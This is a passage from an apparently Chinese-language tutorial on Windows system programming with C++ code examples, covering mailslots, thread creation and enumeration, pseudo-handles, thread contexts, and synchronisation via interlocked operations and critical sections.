class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">delete</span>[] lpBuffer;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 显示信息</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;邮槽的内容: %s\n&quot;</span>, lpBuffer);</span><br><span class="line"><span class="comment">// 计算剩余的消息数</span></span><br><span class="line"><span class="built_in">GetMailslotInfo</span>(hSlot, (LPDWORD)<span class="literal">NULL</span>, &amp;dwMsgSize, &amp;dwMsgCount, <span class="literal">nullptr</span>);</span><br><span class="line"><span class="keyword">delete</span>[] lpBuffer;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="八，线程"><a href="#八，线程" class="headerlink" title="八，线程"></a>八，线程</h1><h2 id="线程创建"><a href="#线程创建" class="headerlink" title="线程创建"></a>线程创建</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID lpThreadParameter</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;我是子线程,%s\n&quot;</span>, lpThreadParameter);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1 创建线程</span></span><br><span class="line">HANDLE hThread = <span class="built_in">CreateThread</span>(</span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//安全属性</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//栈大小</span></span><br><span class="line">ThreadProc,<span class="comment">//线程回调函数</span></span><br><span class="line">(LPVOID)<span class="string">&quot;15PB&quot;</span>,    <span class="comment">//会将此参数传递给回调函数</span></span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>          <span class="comment">//获取线程ID，每一个线程都有一个唯一标识，就是线程ID</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">//2 循环</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;我是主线程\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="线程信号"><a href="#线程信号" class="headerlink" title="线程信号"></a>线程信号</h2><p>WaitForSingleObject(hThread,-1 ); //该函数表示信号，参数一为被创建的线程名，参数二为一直等到有信号的状态，意思是等待被创建线程结束</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 02_关于线程的信号.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID lpThreadParameter</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (n&lt;<span class="number">100000</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,n);</span><br><span class="line">n++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1 创建线程</span></span><br><span class="line">HANDLE hThread = <span class="built_in">CreateThread</span>(</span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//安全属性</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//栈大小</span></span><br><span class="line">ThreadProc,<span class="comment">//线程回调函数</span></span><br><span class="line">(LPVOID)<span class="string">&quot;15PB&quot;</span>,    <span class="comment">//会将此参数传递给回调函数</span></span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>          <span class="comment">//获取线程ID，每一个线程都有一个唯一标识，就是线程ID</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">1000</span>);</span><br><span class="line"><span class="comment">//2 等到线程结束</span></span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(</span><br><span class="line">hThread,</span><br><span class="line"><span class="number">-1</span>      <span class="comment">//一直等到有信号的状态</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="线程遍历"><a href="#线程遍历" class="headerlink" title="线程遍历"></a>线程遍历</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="function">VOID <span class="title">ListProcessThreads</span><span class="params">(DWORD dwPID)</span> </span>&#123;</span><br><span class="line">HANDLE hThreadSnap = INVALID_HANDLE_VALUE;</span><br><span class="line">THREADENTRY32 te32;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建快照</span></span><br><span class="line">hThreadSnap =               <span class="comment">//参数一为一个线程的宏，遍历进程就写进程的宏，模块就写模块的宏</span></span><br><span class="line"><span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPTHREAD, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 设置输入参数，结构的大小</span></span><br><span class="line">te32.dwSize = <span class="built_in">sizeof</span>(THREADENTRY32);</span><br><span class="line"><span class="comment">// 开始获取信息</span></span><br><span class="line"><span class="built_in">Thread32First</span>(hThreadSnap, &amp;te32);</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (te32.th32OwnerProcessID == dwPID)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;线程ID:%d\n&quot;</span>, te32.th32ThreadID);</span><br><span class="line"><span class="comment">//1. 打开线程，得到句柄</span></span><br><span class="line">HANDLE hThread = <span class="built_in">OpenThread</span>(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);</span><br><span class="line"><span class="comment">//2. 暂停</span></span><br><span class="line"><span class="comment">//SuspendThread(hThread);</span></span><br><span class="line"><span class="comment">//ResumeThread(hThread);</span></span><br><span class="line"><span class="built_in">TerminateThread</span>(hThread, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 显示相关信息</span></span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">Thread32Next</span>(hThreadSnap, &amp;te32));</span><br><span class="line"><span class="built_in">CloseHandle</span>(hThreadSnap);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">ListProcessThreads</span>(<span class="number">4068</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="理解伪句柄"><a href="#理解伪句柄" class="headerlink" title="理解伪句柄"></a>理解伪句柄</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID lpThreadParameter</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1 得到句柄</span></span><br><span class="line">HANDLE hThread = (HANDLE)lpThreadParameter;</span><br><span class="line"><span class="comment">//2 获取创建时间</span></span><br><span class="line">FILETIME stcCreationTime, stcExitTime;</span><br><span class="line">FILETIME stcKernelTime, stcUserTime;</span><br><span class="line"><span class="built_in">GetThreadTimes</span>(hThread, &amp;stcCreationTime,</span><br><span class="line">&amp;stcExitTime, &amp;stcKernelTime, &amp;stcUserTime);</span><br><span class="line">FILETIME fi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">SYSTEMTIME st = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="comment">//将标准时间转换为本地时间</span></span><br><span class="line"><span class="built_in">FileTimeToLocalFileTime</span>(&amp;stcCreationTime, &amp;fi);</span><br><span class="line"><span class="comment">//将时间戳转为能够看懂的时间</span></span><br><span class="line"><span class="built_in">FileTimeToSystemTime</span>(&amp;fi, &amp;st);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1 获取当前线程句柄</span></span><br><span class="line">HANDLE hThread = <span class="built_in">GetCurrentThread</span>();</span><br><span class="line">HANDLE hProcess = <span class="built_in">GetCurrentProcess</span>();</span><br><span class="line"><span class="comment">//2 获取当前线程的创建时间</span></span><br><span class="line">FILETIME stcCreationTime, stcExitTime;</span><br><span class="line">FILETIME stcKernelTime, stcUserTime;</span><br><span class="line"><span class="built_in">GetThreadTimes</span>(hThread, &amp;stcCreationTime,</span><br><span class="line">&amp;stcExitTime, &amp;stcKernelTime, &amp;stcUserTime);</span><br><span class="line">FILETIME fi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">SYSTEMTIME st = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="comment">//将标准时间转换为本地时间</span></span><br><span class="line"><span class="built_in">FileTimeToLocalFileTime</span>(&amp;stcCreationTime, &amp;fi);</span><br><span class="line"><span class="comment">//将时间戳转为能够看懂的时间</span></span><br><span class="line"><span class="built_in">FileTimeToSystemTime</span>(&amp;fi, &amp;st);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">10000</span>);</span><br><span class="line"><span class="comment">//2.X 将伪句柄变成一个真句柄</span></span><br><span class="line">HANDLE hThreadParent = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">DuplicateHandle</span>(</span><br><span class="line"><span class="built_in">GetCurrentProcess</span>(), <span class="comment">// 拥有源句柄的进程句柄</span></span><br><span class="line"><span class="built_in">GetCurrentThread</span>(),  <span class="comment">// 指定对象的现有句柄(伪句柄)</span></span><br><span class="line"><span class="built_in">GetCurrentProcess</span>(), <span class="comment">// 拥有新对象句柄的进程句柄</span></span><br><span class="line">&amp;hThreadParent,      <span class="comment">// 用于保存新句柄</span></span><br><span class="line"><span class="number">0</span>,                   <span class="comment">// 安全访问级别</span></span><br><span class="line"><span class="literal">false</span>,               <span class="comment">// 是否可以被子进程继承</span></span><br><span class="line">DUPLICATE_SAME_ACCESS); <span class="comment">// 转换选项</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//3 创建一个子线程</span></span><br><span class="line">HANDLE hChildThread = <span class="built_in">CreateThread</span>(</span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//安全属性</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//栈大小</span></span><br><span class="line">ThreadProc,<span class="comment">//线程回调函数</span></span><br><span class="line">(LPVOID)hThreadParent,    <span class="comment">//会将此参数传递给回调函数</span></span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>          <span class="comment">//获取线程ID，每一个线程都有一个唯一标识，就是线程ID</span></span><br><span class="line">);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hChildThread, <span class="number">-1</span>);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hChildThread); <span class="comment">//关闭句柄</span></span><br><span class="line"><span class="built_in">CloseHandle</span>(hThreadParent);<span class="comment">//关闭句柄</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="获取线程环境"><a href="#获取线程环境" class="headerlink" title="获取线程环境"></a>获取线程环境</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="function">VOID <span class="title">ListProcessThreads</span><span class="params">(DWORD dwPID)</span> </span>&#123;</span><br><span class="line">HANDLE hThreadSnap = INVALID_HANDLE_VALUE;</span><br><span class="line">THREADENTRY32 te32;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建快照</span></span><br><span class="line">hThreadSnap =</span><br><span class="line"><span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPTHREAD, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 设置输入参数，结构的大小</span></span><br><span class="line">te32.dwSize = <span class="built_in">sizeof</span>(THREADENTRY32);</span><br><span class="line"><span class="comment">// 开始获取信息</span></span><br><span class="line"><span class="built_in">Thread32First</span>(hThreadSnap, &amp;te32);</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (te32.th32OwnerProcessID == dwPID)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;线程ID:%d\n&quot;</span>, te32.th32ThreadID);</span><br><span class="line"><span class="comment">//1. 打开线程，得到句柄</span></span><br><span class="line">HANDLE hThread = <span class="built_in">OpenThread</span>(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);</span><br><span class="line"><span class="comment">//2. 暂停</span></span><br><span class="line"><span class="comment">//SuspendThread(hThread);</span></span><br><span class="line"><span class="comment">//3. 获取上下文</span></span><br><span class="line">CONTEXT context = &#123; CONTEXT_ALL &#125;;</span><br><span class="line"><span class="built_in">GetThreadContext</span>(hThread, &amp;context); </span><br><span class="line"><span class="comment">//context.;</span></span><br><span class="line"><span class="comment">//SetThreadContext(hThread, &amp;context); //获取之后，可以修改</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">ResumeThread</span>(hThread);</span><br><span class="line"><span class="comment">//TerminateThread(hThread, 0);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 显示相关信息</span></span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">Thread32Next</span>(hThreadSnap, &amp;te32));</span><br><span class="line"><span class="built_in">CloseHandle</span>(hThreadSnap);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">ListProcessThreads</span>(<span class="number">25088</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="线程同步"><a href="#线程同步" class="headerlink" title="线程同步"></a>线程同步</h2><h3 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h3><p>1 线程同步是一个什么样的问题？？？</p><p>如果你编写的是多线程程序，那么多个线程是并发执行，可以认为他们是同时在执行代码。但是线程和线程之间并非是完全的没有关系。很多时候会有以下两种关系：</p><p>第一种情况，线程A的继续执行，要以线程B完成了某一个操作之后为前提。 这种需求称之为同步</p><p>第二种情况，多个线程在争抢一个资源，比如：全局变量，可以是文件，可以是一个数据结构，可以是一个对象。 这种需求称之为同步互斥。</p><p>2 以下的这些机制怎么解决的这个问题？？各自又什么区别，分别用于什么样的场景呢？？？</p><p>a. 以下这些机制都能够比较方便的解决互斥问题。</p><h4 id="原子操作："><a href="#原子操作：" class="headerlink" title="原子操作："></a>原子操作：</h4><p> 原子操作适合去解决共享资源是全局变量的互斥问题。</p><p> 作用就是对于一个变量的基本算术运算保证是原子性的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="type">long</span> g_n = <span class="number">0</span>;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadPro1</span><span class="params">(LPVOID lpThreadParameter)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">InterlockedIncrement</span>(&amp;g_n);</span><br><span class="line"><span class="comment">//写入文件</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadPro2</span><span class="params">(LPVOID lpThreadParameter)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">InterlockedIncrement</span>(&amp;g_n);</span><br><span class="line"><span class="comment">//读取文件</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">HANDLE hThread1 = <span class="number">0</span>, hThread2 = <span class="number">0</span>;</span><br><span class="line">hThread1 = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadPro1, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">hThread2 = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadPro2, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread1, <span class="number">-1</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread2, <span class="number">-1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, g_n);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="临界区解决互斥问题："><a href="#临界区解决互斥问题：" class="headerlink" title="临界区解决互斥问题："></a>临界区解决互斥问题：</h4><p> 被保护的代码（代码访问了共享资源）放置在</p><p> EnterCriticalSection</p><p> LeaveCriticalSection 之间即可</p><p> 临界区具有线程所有权这个概念，必须进入临界区的线程，调用离开临界区，临界区才会被打开。假如加锁的线程崩溃了，其他线程就锁死了。</p><p>介绍另外3种机制前，先说两个重要概念</p><p>1：</p><p>激发态（有信号） 非激发态（没有信号）</p><p>WaitForSignaleObject(内核对象，时间)；函数的作用，当内核对象处于非激发态的时候，就阻塞住，内核对象处于激发态了，就立即返回。</p><p>2：WaitForSignaleObject的副作用，WaitForSignaleObject对于被等待的内核对象有副作用。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> g_n = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//定义临界区结构体</span></span><br><span class="line">CRITICAL_SECTION g_cs = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadPro1</span><span class="params">(LPVOID lpThreadParameter)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">EnterCriticalSection</span>(&amp;g_cs);</span><br><span class="line">g_n++;</span><br><span class="line"><span class="built_in">LeaveCriticalSection</span>(&amp;g_cs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadPro2</span><span class="params">(LPVOID lpThreadParameter)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">EnterCriticalSection</span>(&amp;g_cs);</span><br><span class="line">g_n++;</span><br><span class="line"><span class="built_in">LeaveCriticalSection</span>(&amp;g_cs);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//初始化临界区对象</span></span><br><span class="line"><span class="built_in">InitializeCriticalSection</span>(&amp;g_cs);</span><br><span class="line">HANDLE hThread1 = <span class="number">0</span>, hThread2 = <span class="number">0</span>;</span><br><span class="line">hThread1 = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadPro1, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">hThread2 = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadPro2, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread1, <span class="number">-1</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread2, <span 